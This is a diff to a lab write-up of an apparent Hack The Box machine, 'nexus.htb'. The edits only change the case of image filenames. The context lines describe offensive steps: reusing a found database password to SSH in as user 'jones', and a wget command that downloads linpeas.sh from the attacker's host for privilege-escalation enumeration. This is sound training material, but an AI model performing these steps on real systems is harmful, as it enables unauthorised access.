@@ -38,7 +38,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ```
 - Added nexus.htb to host file - Navigating to port 80 presents us with web page for Nexus Energy Authority
-- ![http](images/nexus-1.png)
+- ![http](images/Nexus-1.png)
 - Reviewing the website provides us with a job posting
 - ![http](images/nexus-2.png)
 - reviewing the job posting, we see that there is an apply and potential user
@@ -189,7 +189,7 @@ DB_PREFIX=
 ```
 - We then check for users on the box and locate a user jones in the /etc/passwd file
 - since the last database password allowed access, we will try to SSH with this new password for user jones (we get access)
-- ![http](images/Nexus-11.png)
+- ![http](images/nexus-11.png)
 - We then upload linpeas via wget and change to executable and run
 ```shell
 jones@nexus:~$ wget http://10.10.16.97:8000/linpeas.sh
